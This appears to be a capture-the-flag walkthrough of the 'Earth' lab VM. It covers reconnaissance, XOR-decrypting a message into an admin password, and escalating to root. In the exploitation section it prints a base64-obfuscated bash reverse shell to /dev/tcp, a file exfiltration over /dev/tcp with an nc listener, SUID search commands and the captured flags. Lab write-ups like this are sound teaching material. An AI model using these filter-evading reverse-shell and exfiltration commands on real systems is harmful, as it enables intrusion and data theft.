25/05/2025

## Setup
Both machines are running as virtual machines in VirtualBox and are on the **Host-Only** network adapter to be able to communicate with each other.
## Recon
Since we do not know the IP address of the target machine, we have to use the **netdiscover** tool to monitor the interface for ARP packets and conclude the IP address of the target machine.
![[Pasted image 20250525174039.png]]

![[Pasted image 20250525174045.png]]
This shows us that the IP address of the target machine is **192.168.56.101**

The next step is a network scan using **NMAP** and **nessus** to check for open ports and running services.

Nmap reveals an inaccurate fingerprint of the OS
![[Pasted image 20250525193802.png]]
![[Pasted image 20250525193830.png]]

Now let's do another scan that focuses on the ports we know are open, let it take its time while we do a comprehensive scan on all the ports on the machine to see if we missed anything, running default scripts on all ports.

![[Pasted image 20250525194314.png]]
![[Pasted image 20250525194333.png]]
![[Pasted image 20250525194358.png]]

Let's do a full port scan
![[Pasted image 20250525194448.png]]
![[Pasted image 20250531152309.png]]
![[Pasted image 20250531152215.png]]
![[Pasted image 20250531152227.png]]

### Findings
If we look at the nmap scan for port 443, we can see that the subject alternative name is earth.local and earth.terratest.local

Let's put these in the hosts file and navigate to the website.
![[Pasted image 20250531173947.png]]

## Enumeration
Let's start the enumeration process by first navigating to port 80 and 443 of the host to see the website hosted there.

![[Pasted image 20250531152902.png]]

It's just a generic placeholder for a webpage

Let's look through the source code and the common locations for info

Nothing in the source

Nothing in robots.txt

Let's now use Nikto to enumerate potential vulnerabilities

### Nikto
![[Pasted image 20250531153311.png]]
Nothing particularly interesting found
### Gobuster/Dirbuster/Dirb
![[Pasted image 20250531173924.png]]

Nothing interesting found

Let's try for earth.local
![[Pasted image 20250531180259.png]]

### /admin
we found /admin, let's check it out
![[Pasted image 20250531182318.png]]

Leads us to earth.local/admin/login

Let's check terratest.earth.local
![[Pasted image 20250531182451.png]]

### /robots.txt
Check for robots.txt
![[Pasted image 20250531184508.png]]

/testingnotes sure looks interesting, let's check this

### /testingnotes
![[Pasted image 20250531184615.png]]
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.

It was indeed very useful. This reveals quite a large bit of information. We now have access to how the encryption algorithm works that is used to encrypt the messages sent to Earth.

We have another .txt file, *testdata.txt* to test the encryption algorithm.

We have a username, *terra* for the admin portal

### /testingdata
![[Pasted image 20250531185035.png]]

*According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.*

This was used as a test for encrypting the messages.
### Findings
- username for admin portal : terra
- /testdata.txt which is the key for XOR encryption
- the hex keys on the earth page are XOR'd with the key in testdata

### earth.local
Let's check earth.local again
![[Pasted image 20250531174628.png]]

It looks like we can send messages from here

- 37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
- 3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
- 2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a

## Exploitation

Let's try and take the message from the site and decrypt it using Cyberchef using the testdata key we found
![[Pasted image 20250531190449.png]]
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat

earthclimatechangebad4humans

Hashcat probably never would have found that. Nice

Let's try to login to the admin portal
![[Pasted image 20250531190620.png]]

One step further. This CLI command line allows us to run commands on the remote machine. First idea is reverse shell.
![[Pasted image 20250531190905.png]]

![[Pasted image 20250531191223.png]]
Tricky, oneliner reverse shells dont work, gotta be more crafty

Let's base64 encode the oneliner
```
echo "bash -i &>/dev/tcp/192.168.56.102/4444 0>&1" | base64
```
YmFzaCAtaSAmPi9kZXYvdGNwLzE5Mi4xNjguNTYuMTAyLzQ0NDQgMD4mMQo=

Now try to echo the encoded command that is passed to base64 decode and bash
echo YmFzaCAtaSAmPi9kZXYvdGNwLzE5Mi4xNjguNTYuMTAyLzQ0NDQgMD4mMQo= | base64 -d | bash

We've got a shell!!
![[Pasted image 20250531194902.png]]

### User flag
![[Pasted image 20250531195113.png]]
```
[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
```

![[Pasted image 20250531195156.png]]



### Further enumeration
![[Pasted image 20250531191321.png]]

These are the environment variables set
![[Pasted image 20250531191340.png]]

Let's enumerate further
![[Pasted image 20250531191631.png]]

![[Pasted image 20250531191654.png]]

![[Pasted image 20250531191817.png]]

![[Pasted image 20250531191830.png]]

![[Pasted image 20250531191851.png]]

![[Pasted image 20250531192017.png]]

![[Pasted image 20250531192028.png]]

We can view /etc/passwd
![[Pasted image 20250531192049.png]]
root
operator
nobody
ftp user

![[Pasted image 20250531192223.png]]

![[Pasted image 20250531192313.png]]

![[Pasted image 20250531193247.png]]

![[Pasted image 20250531193351.png]]
perm 0777 (readable, writeable and executable by all users)

find / -writable -type d 2>/dev/null
![[Pasted image 20250531193536.png]]

### SUID bit
Our golden ticket, the SUID bit, which allows us to run files with a higher permission than the current user apache. This can be exploited to gain root privileges.
![[Pasted image 20250531193723.png]]
find / -perm -u=s -type f 2>/dev/null
or
find / -type f -perm -04000 -ls 2>/dev/null

We found a file called *reset_root*
![[Pasted image 20250531195911.png]]
![[Pasted image 20250531195927.png]]

Let's move this file over to our host for analysis
``` 
nc -lvnp 4444 > reset_root
```

```
cat /usr/bin/reset_root > /dev/tcp/192.168.56.102/4444
```

After making it executable, let's use ltrace to see how the file is built

![[Pasted image 20250531200443.png]]
It looks like the above files must be present on the filesystem for the binary to run, let's make that so

![[Pasted image 20250531200720.png]]

![[Pasted image 20250531200728.png]]

root password is now *Earth* !

![[Pasted image 20250531200817.png]]

we are root!!

![[Pasted image 20250531200919.png]]
```
[root_flag_b0da9554d29db2117b02aa8b66ec492e]
```

